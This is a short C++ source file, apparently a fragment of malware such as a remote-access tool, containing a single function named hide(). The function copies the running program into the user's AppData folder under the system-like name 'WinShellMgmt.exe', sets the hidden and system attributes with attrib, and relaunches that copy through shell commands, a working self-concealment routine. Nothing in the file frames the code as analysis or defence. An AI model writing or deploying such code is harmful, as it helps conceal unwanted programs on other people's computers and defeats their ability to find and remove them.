#include <string>
using namespace std;

string hide(string curr_file_path) {
	string color_GRE = "\033[92m";
	string color_reset = "\033[0m";
	string GRE_plus = color_GRE + "[+] " + color_reset;

	string pth = string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Shell";
	string command = "mkdir " + pth;
	system(command.c_str());
	command = "copy " + curr_file_path + " " + pth + "\\WinShellMgmt.exe";
	system(command.c_str());
	command = "attrib +h +s " + pth + "\\WinShellMgmt.exe";
	system(command.c_str());
	command = "start \"\" \"" + pth + "\\WinShellMgmt.exe\" & exit";
	system(command.c_str());
	return "...";
}